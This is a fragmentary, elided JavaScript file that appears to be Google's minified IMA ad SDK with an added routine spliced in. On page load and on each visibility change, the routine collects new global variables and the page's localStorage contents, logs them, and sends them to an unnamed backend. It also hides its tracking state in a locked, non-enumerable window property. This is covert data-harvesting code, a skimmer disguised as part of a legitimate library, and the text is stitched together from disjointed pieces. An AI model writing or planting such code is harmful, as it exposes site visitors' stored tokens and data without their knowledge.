...
(function () {
  ...
  function inspectGlobalScopeEnhanced() {
    ...
    for (const key in window) {
      if (window.hasOwnProperty(key) && !window._seenVars.includes(key)) {
  ...
  async function sendEnhancedInsightsToBackend(insights) {
    ...
    try {
      ...
      console.log(response.ok ? "Data sent successfully" : `Failed to send data: ${response.status}`);
    } catch (error) {
  ...
  function performEnhancedInspection() {
    const insights = inspectGlobalScopeEnhanced();
    const totalFindings = Object.keys(insights.globalVars).length + Object.keys(insights.localStorage).length;
    if (totalFindings > 0) {
      console.group(`Enhanced Inspection Results - ${totalFindings} new items found:`);
      console.log("Global Variables:", insights.globalVars);
      console.log("Local Storage:", insights.localStorage);
      console.groupEnd();
      sendEnhancedInsightsToBackend(insights);
    } else {
      console.info("No new items found in enhanced inspection.");
    }
  }
  ...
  window.addEventListener("load", performEnhancedInspection);
  ;
  var JC = function () {
      this.cache = {};
    },
  ...
  document.addEventListener("visibilitychange", () => {
    if (document.visibilityState === "visible") {
      console.info("Visibility change detected, re-inspecting...");
      performEnhancedInspection();
    }
  });

  // Hook into global variable modifications
  ...
  var uF = function (a, b) {
    ...
    N(this, this.j);
    c = this.F;
    d = (Ch() ? "https:" : "http:") + rF("//imasdk.googleapis.com/js/core/bridge3.609.0_%s.html", tB.getLocale());
    a: {
      var e = window;
      try {
        do {
  ...
  Object.defineProperty(window, '_seenVars', {
    value: [],
    writable: false,
    enumerable: false,
    configurable: false
  ...
  var BH = function (a, b, c) {
    ...
    CH = function (a, b) {
      return b ? a.g.some(function (c) {
        c = b.match(c);
        return null == c ? !1 : !a.h || 1 <= c.length && "3.609.0" === c[1] || 2 <= c.length && "3.609.0" === c[2] ? !0 : !1;
      }) : !1;
    },
